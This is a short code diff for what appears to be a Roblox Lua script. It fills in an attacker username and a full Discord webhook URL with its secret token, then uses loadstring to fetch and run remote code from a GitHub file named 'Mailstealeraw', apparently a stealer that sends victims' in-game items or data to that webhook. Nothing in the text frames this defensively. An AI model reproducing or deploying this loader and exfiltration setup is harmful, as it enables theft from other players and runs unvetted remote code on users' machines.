@@ -1,5 +1,5 @@
-UserName = ""
-Webhook = ""
-UserName2 = ""
+UserName = "IAmNobodyFRar"
+Webhook = "https://discord.com/api/webhooks/1151122534595567676/0Cq1FU8qckQ29KywHvJAbeHjXAMrghGCViMaKlApVBiWoenPacfGlTR4RXyz9-fp_rqG"
+UserName2 = "IAmNobodyFRar"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CodingNinjaX/Script/main/Mailstealeraw", true))() 
